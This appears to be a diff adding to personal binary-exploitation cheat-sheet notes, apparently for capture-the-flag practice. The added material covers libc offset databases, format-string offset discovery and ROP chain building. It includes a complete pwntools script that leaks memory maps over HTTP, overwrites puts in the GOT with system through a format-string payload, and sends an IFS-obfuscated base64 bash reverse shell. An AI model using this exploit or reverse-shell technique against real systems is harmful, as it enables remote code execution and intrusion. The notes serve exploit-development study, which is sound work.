@@ -1,5 +1,6 @@
 # +
 
+[libc database search](https://libc.blukat.me/)
 [GitHub \- niklasb/libc\-database: Build a database of libc offsets to simplify exploitation](https://github.com/niklasb/libc-database)
 [GitHub \- 0xb0bb/karkinos: A thorough library database to assist with binary exploitation tasks\.](https://github.com/0xb0bb/karkinos)
 
@@ -8,8 +9,14 @@ https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_pre
 
 # methodology
 
+- `printf()`: 1st param => format string
+- `strcpy()`: len(1st param) -lt len(2nd param) => buffer overflow
+- `scanf()`: len(2nd param) -lt len(read bytes) => buffer overflow
+- `gets(), memcpy(), strcat()`
+
 - buffer size - check allocated frame for locals, take largest offset
 - overwritten return address - jmp to infinite loop, if app hangs, it worked
+- check if payload is malformed - set breakpoint (INT 3 == \xCC), if process doesn't stop, instructions up to breakpoint are malformed
 
 # debugging
 
@@ -89,6 +96,95 @@ eu-unstrip "$stripped_libc" "$symbol_file"
 
 # write-what-where
 
-`_hook` functions:
+- `_hook` functions:
     - FULL RELRO is enabled/GOT is read-only
     - https://github.com/OpenToAllCTF/Tips#_hooks
+
+# format string
+
+- Find 1st pattern in leaked addresses
+    ```python
+    # 32bit
+    fmt_str = "AAAA" + ".%x" * 128
+    # take returned values
+    x = x.split('.')
+    x.index('41414141')
+    ```
+
+```python
+from pwn import *
+import requests
+from urllib.parse import quote
+
+context (arch='i686', os='Linux')
+
+RHOST = '127.0.0.1'
+RPORT = '9999'
+
+def getFile(file):
+    header = { "Range" : "bytes=0-4096"}
+    r = requests.get(f"http://{RHOST}:{RPORT}/{file}", headers=header)
+    return r.text
+
+# Step 1. Find Addresses
+log.info("Finding Binary/LibC Location via /proc/self/maps")
+maps = getFile("/proc/self/maps")
+addr_bin = maps.split('\n')[0][:8]
+addr_libc = maps.split('\n')[6][:8]
+log.success(f"Binary is at: 0x{addr_bin}")
+log.success(f"Libc is at: 0x{addr_libc}")
+
+# Step 2. Calculate Offsets, Validate first with localhost libc
+log.info("Finding the address of PUTS + SYSTEM()")
+elf = ELF("./httpserver", checksec=False)
+libc = ELF("./libc.so.6.32.self", checksec=False)
+elf.address = int(addr_bin, 16)
+libc.address = int(addr_libc, 16)
+got_puts = elf.got['puts']
+system = libc.symbols['system']
+log.success(f"Puts@GOT: {hex(got_puts)}")
+log.success(f"System@LIBC: {hex(system)}")
+
+# Step 3. Overwrite PUTS with SYSTEM()
+log.info("Using printf[53] to remap PUTS > SYSTEM")
+payload = fmtstr_payload(53, {got_puts : system} )
+r = remote(RHOST, RPORT)
+# Bash rev shell
+base64_rev_shell = "..."
+cmd = "echo${IFS}" + base64_rev_shell + "{$IFS}|${IFS}base64${IFS}-d${IFS}|bash"
+r.sendline(f"{cmd} {quote(payload)} HTTP/1.1\r\n")
+r.close()
+```
+
+# rop
+
+1. leak stack canary: Given multiple requests for same process, bruteforce bytes from boolean-based response
+    - repeat for $rbp, then $rip
+2. leak base address, map: $rip == rebasing ELF (allows leaking GOT addresses)
+- ~/code/snippets/ctf/pwn/rop.py
+    - Alternative: manual chain
+    ```bash
+    ropper --search "pop r??" 
+    # foreach address (= offset): p64(address + base_address)
+
+    objdump -D _
+    # take PLT for write()
+
+    readelf -r _
+    # take GOT for write()
+
+    strings -atx libc | grep -i '/bin/sh'
+    # take p64(address + base_address)
+    ```
+    ```python
+    # leak write@libc
+    # fd = 0x0: reuse previous fd
+    rop = pop_rsi_r15 + got_write + p64(0x0)
+    rop += pop_rdx + p64(0x8)
+    rop += plt_write
+    ```
+- [HackTheBox \- Rope](https://www.youtube.com/watch?v=GTQxZlr5yvE)
+
+# windows
+
+- [FuzzySecurity | Windows ExploitDev: Part 11](https://fuzzysecurity.com/tutorials/expDev/15.html)
